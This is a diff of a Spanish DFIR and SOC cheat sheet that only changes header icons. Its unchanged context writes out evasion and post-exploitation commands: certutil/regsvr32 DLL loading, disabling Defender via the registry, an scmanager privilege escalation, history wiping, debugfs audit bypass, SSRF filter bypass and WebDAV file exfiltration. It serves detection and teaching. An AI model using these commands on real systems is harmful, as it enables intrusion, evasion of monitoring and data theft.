 Verificar si el archivo **".sudo_as_admin_successful"** está en el directorio de inicio del usuario. Si se encuentra, entonces el atacante ejecutó el comando "sudo".
 
-### ▶️ Detectar malware Linux fileless (memfd)
+### 📜 Detectar malware Linux fileless (memfd)
 
 Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de detección es usar *memfd* para cualquier proceso y esto nos puede indicar malware sin archivos (fileless). 
 
@@ -2113,9 +2113,9 @@ Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de
 cat /proc/*/maps | grep "memfd"
 ```
 
-## ✅ Redes
+## 📁 Redes
 
-### ▶️ Filtros Wireshark para analistas
+### 📜 Filtros Wireshark para analistas
 
 - Referencia Wireshark: https://www.wireshark.org/docs/dfref
 - Brim Zed (herramienta que simplifica el análisis de datos superestructurados .pcapng): https://www.brimdata.io/download
@@ -2301,9 +2301,9 @@ Mostrar paquetes con reconocimientos duplicados en TCP.
 tcp.analysis.duplicate_ack
 ```
 
-## ✅ Contenedores
+## 📁 Contenedores
 
-### ▶️ Análisis Forense en contenedores Docker 
+### 📜 Análisis Forense en contenedores Docker 
 
 Si un contenedor malicioso modifica archivos o acciones de malware al iniciarse, es posible que se pierdan muchos artefactos de seguridad. La solución podría ser trabajar con el contenedor que se crea pero que no se inicia.
 
@@ -2341,9 +2341,9 @@ ctr image mount docker.io/library/nginx:latest rootfs
 ls -lathF rootfs
 ```
 
-## ✅ Android & iOS
+## 📁 Android & iOS
 
-### ▶️ Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp
+### 📜 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp
 
 Un usuario envió imágenes a través de Whatsapp, después las eliminó de su dispositivo móvil, pero estas imágenes todavía están en la carpeta "sent" de WhatsApp.
 
@@ -2351,9 +2351,9 @@ Un usuario envió imágenes a través de Whatsapp, después las eliminó de su d
 "Internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
 ```
 
-## ✅ Varios
+## 📁 Varios
 
-### ▶️ Artefactos en dispositivos USB en Windows, Linux y MacOS
+### 📜 Artefactos en dispositivos USB en Windows, Linux y MacOS
 
 `Windows`
 
@@ -2429,7 +2429,7 @@ Habilitar un registro detallado USB configurando "EnableLogging=1" en el fichero
 - USBDeview: https://www.nirsoft.net/utils/usb_devices_view.html
 - USB Forensic Tracker (USBFT) Windows, Linux y MacOS: https://www.orionforensics.com/forensics-tools/usb-forensic-tracker
 
-### ▶️ Recopilación de artefactos de paths en Windows, Linux y MacOS
+### 📜 Recopilación de artefactos de paths en Windows, Linux y MacOS
 
 `WINDOWS`
 
@@ -2653,81 +2653,81 @@ Otros paths:
 */downloads.sqlite*
 ```
 
-## ✅ Herramientas
+## 📁 Herramientas
 
-### ▶️ Autopsy: Herramienta avanzada de análisis forense digital
+### 📜 Autopsy: Herramienta avanzada de análisis forense digital
 
 Es una interfaz gráfica de usuario para Sleuth Kit que facilita la realización de análisis forenses digitales. Proporciona características avanzadas para análisis de imágenes forenses, análisis de metadatos, búsqueda avanzadas, análisis de memoria volátil, generación de informes detallados, integración con otras herramientas forenses.
 
 - https://www.autopsy.com
 
-### ▶️ X-Ways Forensics: Herramienta avanzada de análisis forense digital
+### 📜 X-Ways Forensics: Herramienta avanzada de análisis forense digital
 
 Es una herramienta forense que ofrece análisis detallados, adquisición, examen y presentación de evidencia digital en investigaciones forenses. Otra alternativa similar a Autopsy.
 
 - https://www.x-ways.net/forensics
 
-### ▶️ Volatility: Análisis de volcados de memoria
+### 📜 Volatility: Análisis de volcados de memoria
 
 Es una herramienta de análisis forense de memoria volátil (RAM) que puede utilizarse para analizar volcados de memoria y buscar indicadores de actividad maliciosa o manipulación de archivos en la memoria del sistema.
 
 - https://volatilityfoundation.org
 
-### ▶️ WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows
+### 📜 WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows
 
 Realiza extracciones de diferentes artefactos forenses de usuario, sistema y sistema de ficheros de un ordenador, tanto en caliente como a partir de una imagen forense, para que posteriormente puedan ser analizados e interpretados en una investigación por parte de un profesional analista de DFIR.
 
 - https://www.securizame.com/wintriage
 
-### ▶️ Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows
+### 📜 Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows
 
 Se utiliza para recopilar información sobre sistemas Windows en tiempo real, permite obtener una visión detallada del estado de un sistema y de las actividades que se están llevando a cabo en él a través de consultas Velociraptor Query Language (VQL) donde brindan acceso a las API de Windows. La monitorización en tiempo real incluye información del sistema, actividad del usuario, registros de eventos, procesos en ejecución, archivos abiertos, conexiones de red, se puede definir y personalizar los artefactos, entre otras características.
 
 - https://github.com/Velocidex/velociraptor
 - https://docs.velociraptor.app
 
-### ▶️ LogonTracer: Trazabilidad de inicios de sesión en Active Directory
+### 📜 LogonTracer: Trazabilidad de inicios de sesión en Active Directory
 
 Herramienta para investigar inicios de sesión maliciosos mediante la visualización y el análisis de los registros de eventos de Windows Active Directory. Asocia un nombre de host (o una dirección IP) y un nombre de cuenta encontrados en eventos relacionados con el inicio de sesión y lo muestra como un gráfico. De esta forma, es posible ver en qué cuenta se produce el intento de inicio de sesión y qué host se utiliza.
 
 - https://github.com/JPCERTCC/LogonTracer
 
-### ▶️ AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación
+### 📜 AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación
 
 Análisis de registros de autenticación de Linux (auth.log). AuthLogParser escanea el archivo de registro auth.log y extrae información clave, como inicios de sesión SSH, creaciones de usuarios, nombres de eventos, direcciones IP y más. Proporciona una descripción general clara y concisa de las actividades registradas en los registros de autenticación.
 
 - https://github.com/YosfanEilay/AuthLogParser
 
-### ▶️ Skadi: Análisis de artefactos e imágenes forenses
+### 📜 Skadi: Análisis de artefactos e imágenes forenses
 
 Pack de herramientas que permite la recopilación, el procesamiento y el análisis avanzado de artefactos e imágenes forenses. Funciona en máquinas MacOS, Windows y Linux.
 
 - https://github.com/orlikoski/Skadi
 
-### ▶️ GRR - Google Rapid Response
+### 📜 GRR - Google Rapid Response
 
 Es un framework de respuesta a incidentes centrado en análisis forense remoto en vivo. GRR es un cliente (agente) de Python que se instala en los sistemas de destino y una infraestructura de servidor de Python que puede administrar y comunicarse con los clientes. https://grr-doc.readthedocs.io/en/latest
 
 - https://github.com/google/grr
 
-### ▶️ Arkime - Almacenar e indexar el tráfico de red en formato PCAP
+### 📜 Arkime - Almacenar e indexar el tráfico de red en formato PCAP
 
 Almacenar e indexar el tráfico de red en formato PCAP estándar, proporcionando un acceso indexado rápido. Se proporciona una interfaz web intuitiva y sencilla para explorar, buscar y exportar PCAP.
 
 - https://github.com/arkime/arkime
 
-### ▶️ Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS
+### 📜 Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS
 
 Recopila información diferente del sistema (Windows, Linux y MacOS) para su posterior revisión en busca de comportamientos anómalos o entrada de datos inesperada, también busca archivos o actividades inusuales.
 
 - https://github.com/Johnng007/Live-Forensicator
 
-### ▶️ FTK Forensic Toolkit (Exterro)
+### 📜 FTK Forensic Toolkit (Exterro)
 FTK (Forensic Toolkit) de Exterro permite recopilar, procesar y analizar datos en investigaciones forenses. Facilita la identificación y preservación de evidencia digital para soportar investigaciones y litigios.
 
 - https://www.exterro.com/digital-forensics-software/forensic-toolkit
 
-### ▶️ EnCase Forensic (ondata)
+### 📜 EnCase Forensic (ondata)
 
 *EnCase Endpoint Investigator de ondata*: busca, recolecta, preserva y analiza gran cantidad de datos y genera informes detallados sobre estos hallazgos; todo de forma centralizada, con interrupciones mínimas y sin importar el tamaño ni la complejidad del entorno de red.
 
@@ -2735,7 +2735,7 @@ FTK (Forensic Toolkit) de Exterro permite recopilar, procesar y analizar datos e
 
 - https://www.ondata.es/recuperar/forensics-guidance.htm
 
-### ▶️ SANS DFIR - Posters & Cheat Sheets
+### 📜 SANS DFIR - Posters & Cheat Sheets
 
 - https://www.sans.org/posters/?focus-area=digital-forensics
 
@@ -2743,9 +2743,9 @@ FTK (Forensic Toolkit) de Exterro permite recopilar, procesar y analizar datos e
 
 # 📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense
 
-## ✅ Windows
+## 📁 Windows
 
-### ▶️ Comando Windows: "net" y "net1"
+### 📜 Comando Windows: "net" y "net1"
 
 El comando "net1" funcionará igual que el comando "net".
 ```cmd
@@ -2753,7 +2753,7 @@ net1 accounts
 net accounts
 ```
 
-### ▶️ Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)
+### 📜 Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)
 
 El comando "certutil.exe" puede ser utilizado por un actor malicioso para realizar diversas acciones maliciosas. Es una buena postura de seguridad configurar reglas preventivas y alertas para detectar estas técnicas.
 
@@ -2775,7 +2775,7 @@ certutil -decode .\evildll.txt evildll.dll
 regsvr32 /s /u .\evildll.dll
 ```
 
-### ▶️ Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"
+### 📜 Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"
 
 Existen multitud de técnicas para la descarga y ejecución de ficheros a través de PowerShell, estas técnicas son comunes por los actores maliciosos para poder transferirse malware a una máquina previamente comprometida o con acceso limitado o través de máquinas de salto para ejecutar después técnicas de post-explotación o movimiento lateral. Es interesante conocer las técnicas más comunes y añadir reglas de detección.
 
@@ -2812,7 +2812,7 @@ Get-BitsTransfer -Name "TestJob1" | Complete-BitsTransfer
 
 - Más info: https://github.com/adrianlois/scripts-misc/tree/main/07.PS-IEX-WebRequest-WebClient-BitsTransfer
 
-### ▶️ Post-Explotación - PrivEsc con scmanager
+### 📜 Post-Explotación - PrivEsc con scmanager
 LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).
 
 - https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager
@@ -2822,7 +2822,7 @@ sc.exe sdset scmanager D:(A;;KA;;;WD)
 [SC] SetServiceObjectSecurity SUCCESS
 ```
 
-### ▶️ DLL Hijacking *cscapi.dll*
+### 📜 DLL Hijacking *cscapi.dll*
 Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.
 
 - https://twitter.com/D1rkMtr/status/1613568545757220864
@@ -2831,7 +2831,7 @@ Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podr�
 C:\Windows\cscapi.dll
 ```
 
-### ▶️ Otras técnicas de ejecución de CMD o PowerShell
+### 📜 Otras técnicas de ejecución de CMD o PowerShell
 
 Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
 ```cmd
@@ -2845,7 +2845,7 @@ query pwned
 
 La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).
 
-### ▶️ Uso de *type* para descargar o subir ficheros
+### 📜 Uso de *type* para descargar o subir ficheros
 
 1. Alojar un servidor WebDAV con acceso anónimo r/w
 2. Download: 
@@ -2857,7 +2857,7 @@ type \\webdav-ip\path\file.ext > C:\path\file.ext
 type C:\path\file.ext > \\webdav-ip\path\file.ext
 ```
 
-### ▶️ Bloquear conexiones USB: Rubber Ducky y Cactus WHID
+### 📜 Bloquear conexiones USB: Rubber Ducky y Cactus WHID
 
 - HID - Hardware ID 
 - VID - Vendor ID
@@ -2883,7 +2883,7 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
 ```
 
-### ▶️ Claves de registro de Windows donde se almacenan las contraseñas
+### 📜 Claves de registro de Windows donde se almacenan las contraseñas
 
 Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 
 
@@ -2914,7 +2914,7 @@ HKCU\Software\PremiumSoft\NavicatOra\Servers
 HKCU\Software\TigerVNC\WinVNC4
 ```
 
-### ▶️ WDigest Authentication: Habilitado / Deshabilitado
+### 📜 WDigest Authentication: Habilitado / Deshabilitado
 
 Si un malware habilita la "Autenticación WDigest" las contraseñas se almacenarán en texto claro en LSASS y en la memoria. En Windows 10 está deshabilitado de forma predeterminada.
 ```
@@ -2924,7 +2924,7 @@ Habilitado:    UseLogonCredential = 1
 Deshabilitado: UseLogonCredential = 0
 ```
 
-### ▶️ Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)
+### 📜 Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)
 
 PowerShell
 ```ps
@@ -2955,18 +2955,18 @@ msinfo32 /report > Producto de placa base
 ("HKLM:\HARDWARE\DESCRIPTION\System", "HKLM:\HARDWARE\DESCRIPTION\System\BIOS") | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object -Property SystemBiosVersion, SystemManufacturer, SystemProductName
 ```
 
-### ▶️ Técnicas de ofuscación en la ejecución de comandos en Windows
+### 📜 Técnicas de ofuscación en la ejecución de comandos en Windows
 
 - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation
 
-### ▶️ Detectar acciones de AutoRun al abrir una Command Prompt (cmd)
+### 📜 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)
 
 Un atacante creó un valor *"AutoRun"* en la siguiente clave de registro, aquí pudo agregar un comando malicioso como sus datos de valor. Ahora, cada vez que se inicie una consola cmd este comando se ejecutará automáticamente.
 ```
 HKLM\SOFTWARE\Microsoft\Command Processor
 ```
 
-### ▶️ Extensiones ejecutables alternativas a .exe
+### 📜 Extensiones ejecutables alternativas a .exe
 
 Un atancante puede renombrar la extensión de un fichero malicioso a extensiones como: 
 
@@ -2974,7 +2974,7 @@ Un atancante puede renombrar la extensión de un fichero malicioso a extensiones
 
 Todas se ejecutarán de la misma forma que .exe.
 
-### ▶️ Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX_ALLOCATION)
+### 📜 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX_ALLOCATION)
 
 Un posible actor malicioso podría crear una carpeta visible a través de línea de comandos ejecutando un dir y/o también verla en un explorador de Windows. 
 
@@ -3018,7 +3018,7 @@ C:\malware\test2.::$index_allocation>cd ..
 C:\malware>
 ```
 
-### ▶️ Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)
+### 📜 Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)
 Una forma de poder eludir el sistema de protección por defecto de Windows es renombrar el fichero del proceso de ejecución del servicio de Windows Defender. De forma que al iniciar el sistema este no se pueda ejecutar al no encontrar correctamente el nombre de este fichero que levanta el proceso de servicio de Windows Defender. Esto permite a actores maliciosos poder ejecutar binarios maliciosos como por ejemplo Mimikatz u otros.
 
 **MsMpEng.exe** es el proceso principal de la aplicación antimalware Windows Defender. Windows Defender viene preinstalado en Windows 11 y Windows 10, ubicado en "*C:\Program Files\Windows Defender\MsMpEng.exe*"
@@ -3036,9 +3036,9 @@ Este proceso no se puede modificar renombrándolo ya que está constantantemente
     - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "LastKnowGood" > Value: 7
 6. Reiniciar equipo.
 
-## ✅ Linux
+## 📁 Linux
 
-### ▶️ *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
+### 📜 *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
 Si un actor malicioso accede a un archivo crítico, este puede estar auditado y los investigadores de SOC recibirán una alerta. Pero, si se usan el comando "*debugfs*" para acceder al archivo, es posible omitir esta alerta.
 - https://gtfobins.github.io/gtfobins/debugfs
 ```bash
@@ -3051,7 +3051,7 @@ debugfs: cat /etc/passwd
 
 - Referencia: https://gtfobins.github.io
 
-### ▶️ Detectar la ejecución de comandos de forma oculta en history
+### 📜 Detectar la ejecución de comandos de forma oculta en history
 
 Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.
 
@@ -3072,7 +3072,7 @@ $ history
     3  history
 ```
 
-### ▶️ Deshabilitar el uso del historial de la Shell
+### 📜 Deshabilitar el uso del historial de la Shell
 
 Un actor malicioso puede ejecutar estos comandos para no guardar o registrar en el archivo .bash_history el historial de acciones en la shell como técnica anti forense y evitar ser detectados.
 ```bash
@@ -3080,7 +3080,7 @@ export HISTFILE=/dev/null
 export HISTFILESIZE=0
 ```
 
-### ▶️ Eliminar el historial de comandos de la Shell (.bash_history & .zsh_history)
+### 📜 Eliminar el historial de comandos de la Shell (.bash_history & .zsh_history)
 
 Limpiar todo el historial del usuario actual.
 ```bash
@@ -3104,7 +3104,7 @@ cat /home/user/.bash_history 2> /dev/null > /home/user/.bash_history
 cat /home/user/.zsh_history 2> /dev/null > /home/user/.zsh_history
 ```
 
-### ▶️ Auditoría en el uso privilegiado de los siguientes comandos en Linux
+### 📜 Auditoría en el uso privilegiado de los siguientes comandos en Linux
 
 Los siguientes comandos privilegiados deberían auditarse:
 |   |   |   |   |   |   |
@@ -3127,9 +3127,9 @@ Los siguientes comandos no se instalan por defecto, no obstante en caso de insta
 
 - Referencia: https://gtfobins.github.io
 
-## ✅ Redes
+## 📁 Redes
 
-### ▶️ WAF Bypass (SSRF): usar acortamiento IP local
+### 📜 WAF Bypass (SSRF): usar acortamiento IP local
 
 | Bloqueo            | Bypass           |
 |--------------------|------------------|
@@ -3137,7 +3137,7 @@ Los siguientes comandos no se instalan por defecto, no obstante en caso de insta
 | http://127.0.0.1   | http://127.1     |
 | http://192.168.0.5 | http://192.168.5 |
 
-### ▶️ Dirección IPv6 asignada a IPv4 utilizada para ofuscación
+### 📜 Dirección IPv6 asignada a IPv4 utilizada para ofuscación
 
 Un dirección IPv6 se puede asignar a una dirección IPv4. Por lo tanto, si un actor malicioso intenta reconocer un servidor para conectarse a una dirección IPv4 y es bloqueado por la solución de seguridad. Probar esta técnica para ofuscar la comunicación y evitar posibles detecciones.
 
@@ -3156,9 +3156,9 @@ Respuesta desde 8.8.8.8: bytes=32 tiempo=13ms TTL=117
 
 - Referencia: https://isc.sans.edu/diary/30466
 
-## ✅ Varios
+## 📁 Varios
 
-### ▶️ Forensia (Anti-Forensic)
+### 📜 Forensia (Anti-Forensic)
 
 Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.
 
